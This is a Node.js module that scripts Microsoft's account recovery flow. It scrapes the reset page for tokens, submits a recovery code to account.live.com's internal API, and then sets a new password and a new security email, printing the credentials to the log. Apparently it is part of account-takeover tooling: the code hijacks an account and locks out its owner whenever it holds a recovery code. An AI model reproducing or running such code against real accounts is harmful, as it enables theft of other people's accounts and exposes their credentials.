const HttpClient = require("../process/HttpClient");

module.exports = async (email, recoveryCode, secEmail, password) => {
    console.log(`Recovery secure called with ${email} ${recoveryCode} ${secEmail} ${password}`);

    try {
        console.log(`Step 1: Initializing HTTP client`);
        const axios = new HttpClient();

        console.log(`Step 2: Fetching reset password page for ${email}`);
        const data = await axios.get(
            `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${email}`,
            { proxy: false }
        );

        if (data?.data.includes("reset-password-signinname_en")) {
            console.log(`Step 2 Failed: Invalid email!`);
            return null;
        }

        console.log(`Step 3: Extracting server data from page`);
        let serverData = null;
        const match = data.data.match(/var\s+ServerData=(.*?)(?=;|$)/);
        if (!match) {
            console.log(`Step 3 Failed: Could not extract server data`);
            return null;
        }
        serverData = JSON.parse(match[1]);

        console.log(`Step 4: Getting authentication cookie`);
        let d = axios.getCookie('amsc');

        if (!serverData?.sRecoveryToken || !d || !serverData?.apiCanary) {
            console.log(`Step 4 Failed: Missing required details (token: ${!!serverData?.sRecoveryToken}, cookie: ${!!d}, canary: ${!!serverData?.apiCanary})`)
            return null;
        }

        console.log(`Step 5: Verifying recovery code`);
        const recTokenResponse = await axios.post(
            "https://account.live.com/API/Recovery/VerifyRecoveryCode",
            {
                publicKey: "2CBB3761027476727BDDBC9DE02870BE01ED793A",
                recoveryCode: recoveryCode,
                code: recoveryCode,
                scid: 100103,
                token: decodeURIComponent(serverData.sRecoveryToken),
                uiflvr: 1001,
            },
            {
                headers: {
                    "Content-type": "application/json; charset=utf-8",
                    "canary": serverData.apiCanary,
                }
            }
        );

        if (!recTokenResponse?.data?.token) {
            console.log(`Step 5 Failed: Invalid recovery code`);
            return "invalid";
        }
        console.log(`Step 5 Success: Recovery code verified`);

        console.log(`Step 6: Starting recovery process with up to 3 attempts`);
        const maxRetries = 3;
        for (let attempt = 0; attempt <= maxRetries; attempt++) {
            try {
                console.log(`Step 6.${attempt + 1}: Recovery attempt ${attempt + 1}`);

                const recoveryResponse = await axios.post(
                    "https://account.live.com/API/Recovery/RecoverUser",
                    {
                        contactEmail: secEmail,
                        contactEpid: "",
                        password: password,
                        passwordExpiryEnabled: 0,
                        publicKey: "2CBB3761027476727BDDBC9DE02870BE01ED793A",
                        token: decodeURIComponent(recTokenResponse.data.token),
                    },
                    {
                        headers: {
                            "Content-type": "application/json; charset=utf-8",
                            "Canary": serverData.apiCanary,
                        }
                    }
                );

                let d = JSON.stringify(recoveryResponse?.data);
                console.log(`Step 6.${attempt + 1} Response: ${d}`);

                if (recoveryResponse?.data?.error) {
                    if (recoveryResponse.data.error.code === "6001") {
                        console.log(`Step 6.${attempt + 1} Failed: TFA required!`);
                        return "tfa";
                    } else if (recoveryResponse.data.error.code === "1218") {
                        console.log(`Step 6.${attempt + 1} Success: Same details provided - treating as success!`);
                        // Return success data even when same details are provided
                        return {
                            email2: email,
                            recoveryCode: recoveryCode, // Use original recovery code since new one might not be available
                            secEmail: secEmail,
                            password: password,
                        };
                    }
                }

                if (recoveryResponse?.data?.apiCanary) {
                    console.log(`Step 6.${attempt + 1} Success: Account recovered successfully!`);
                    return {
                        email2: email,
                        recoveryCode: recoveryResponse.data.recoveryCode,
                        secEmail: secEmail,
                        password: password,
                    };
                }

            } catch (error) {
                console.error(`Step 6.${attempt + 1} Error: Recovery attempt ${attempt + 1} failed:`, error.message);

                const errData = error.response?.data;

                if (errData?.error) {
                    if (errData.error.code === "6001") {
                        console.log(`Step 6.${attempt + 1} Failed: TFA required in error response!`);
                        return "tfa";
                    } else if (errData.error.code === "1218") {
                        console.log(`Step 6.${attempt + 1} Success: Same details provided in error - treating as success!`);
                        // Return success data even when same details are provided
                        return {
                            email2: email,
                            recoveryCode: recoveryCode, // Use original recovery code since new one might not be available
                            secEmail: secEmail,
                            password: password,
                        };
                    }
                }

                if (attempt === maxRetries) {
                    console.log(`Step 6 Final: All attempts exhausted`);
                    if (errData?.apiCanary) {
                        console.log(`Step 6 Final Success: Account recovered via error response!`);
                        return {
                            email2: email,
                            recoveryCode: errData.recoveryCode,
                            secEmail: secEmail,
                            password: password,
                        };
                    }
                    console.log(`Step 6 Final Failed: Invalid recovery`);
                    return "invalid";
                }
            }
        }
    } catch (error) {
        console.error('Error in recovery process:', error.message);
        return "invalid";
    }

    return "invalid";
};
